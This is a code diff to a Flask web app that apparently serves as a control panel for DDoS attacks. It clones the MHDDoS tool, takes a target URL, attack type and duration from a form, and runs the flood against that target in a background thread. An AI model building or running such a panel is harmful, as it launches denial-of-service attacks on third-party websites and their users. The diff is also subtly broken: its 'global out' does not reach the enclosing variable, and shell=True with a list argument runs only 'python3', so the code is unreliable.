@@ -5,6 +5,7 @@ from flask import Flask, render_template, request, redirect, url_for, flash, jso
 import os
 import json
 import subprocess
+import threading
 # checking if the MHDDOS folder exist
 if not os.path.exists("data/mhddos"):
     os.system("git clone https://github.com/MatrixTM/MHDDoS data/mhddos")
@@ -62,13 +63,20 @@ def newattack():
         url = request.form["url"]
         time = request.form["time"]
         # startinng the attack 
-        arguments = [f"{type_attack}", f"{url}", "0", "100", "proxies.txt", f"{time}"]
-        command = ["python3", "data/mhddos/start.py"] + arguments
-        process = subprocess.run(command,shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, universal_newlines=True, bufsize=1, close_fds=True)
-        
         out = ""
-        for line in process.stdout:
-            out += line + "\n"  
+        def run_attack():
+            global out
+            arguments = [f"{type_attack}", f"{url}", "0", "100", "proxies.txt", f"{time}"]
+            command = ["python3", "data/mhddos/start.py"] + arguments
+            process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+            
+            out = ""
+            for line in process.stdout:
+                out += line + "\n"
+            LOGS.info(f"Attack output: {out}")
+            LOGS.info("Attack completed")
+        attack_thread = threading.Thread(target=run_attack)
+        attack_thread.start()
         flash(f"Attack launched \n {out}")
         LOGS.info("New attack launched")
     
